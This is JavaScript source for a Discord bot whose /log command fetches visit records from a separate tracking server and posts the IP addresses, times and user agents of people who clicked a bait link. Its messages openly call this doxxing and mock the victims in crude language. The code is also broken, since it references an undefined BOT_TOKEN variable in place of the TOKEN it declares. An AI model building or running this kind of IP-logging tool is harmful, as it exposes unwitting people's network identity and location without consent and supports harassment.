const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require("discord.js");
const fetch = (...args) => import("node-fetch").then(({ default: f }) => f(...args));

// ============================================================
//  PUT YOUR CREDENTIALS HERE
// ============================================================
const TOKEN = process.env.TOKEN;
const CLIENT_ID = "1488652011485270117";

// When running locally this points to your server.js.
// On Railway, change this to your Railway server URL e.g.:
// const SERVER_URL = "https://your-app.up.railway.app";
const SERVER_URL = process.env.SERVER_URL || "http://localhost:3000";
// ============================================================

const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// Register the /log slash command
const commands = [
  new SlashCommandBuilder()
    .setName("log")
    .setDescription("show who got fucking ip logged lol")
    .toJSON(),
];

const rest = new REST({ version: "10" }).setToken(BOT_TOKEN);

(async () => {
  try {
    console.log("Registering slash commands...");
    await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
    console.log("Slash commands registered ✅");
  } catch (err) {
    console.error("Failed to register commands:", err);
  }
})();

client.once("ready", () => {
  console.log(`Logged in as ${client.user.tag} 🤖`);
});

client.on("interactionCreate", async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if (interaction.commandName === "log") {
    await interaction.deferReply();

    try {
      const res = await fetch(`${SERVER_URL}/visits`);
      const visits = await res.json();

      if (visits.length === 0) {
        await interaction.editReply("eh nobody fucking doxxed yet");
        return;
      }

      // Show the last 5 visits
      const recent = visits.slice(-5).reverse();
      const lines = recent.map((v, i) => {
        const time = new Date(v.timestamp).toLocaleString("en-US", {
          timeZone: "America/Chicago",
          dateStyle: "short",
          timeStyle: "short",
        });
        const shortUA = v.userAgent.split(" ").slice(0, 4).join(" ");
        return `**${i + 1}.** \`${v.ip}\` — ${time}\n   └ ${shortUA}`;
      });

      const message = [
        `some bitch just click za link noo he cooked`,
        ``,
        `**Last ${recent.length} visit(s):**`,
        ...lines,
        ``,
        `**Total hits:** ${visits.length}`,
      ].join("\n");

      await interaction.editReply(message);
    } catch (err) {
      console.error(err);
      await interaction.editReply(
        "Couldn't reach the tracking server. Is server.js running? 🤔"
      );
    }
  }
});

client.login(BOT_TOKEN);
